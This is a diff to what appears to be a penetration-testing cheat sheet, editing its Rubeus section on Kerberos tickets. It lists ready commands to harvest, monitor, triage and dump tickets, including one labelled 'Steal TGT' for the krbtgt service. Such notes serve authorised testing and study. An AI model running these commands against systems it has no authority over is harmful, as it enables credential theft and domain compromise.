@@ -498,10 +498,11 @@ Brute Password spray:
 #### List tickets
 https://specterops.gitbook.io/ghostpack/rubeus/ticket-extraction-and-harvesting
 
-Get tickets currently on System:
+Monitor tickets currently on System:
 - All - ```Rubeus.exe harvest /interval:30 /runfor:300 /nowrap```
-- Specific User on Machine - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
+- Specific User on Machine - ```rubeus.exe monitor /targetuser:Mary /interval:10 /runfor:100 /nowrap```
 
+Get tickets currently on System:
 - List all kerberos tickets from current logon sessions - ```Rubeus.exe triage```
 - Steal TGT from a specific Logon Session - ```Rubeus.exe dump /luid:0x6042e /service:krbtgt```
 
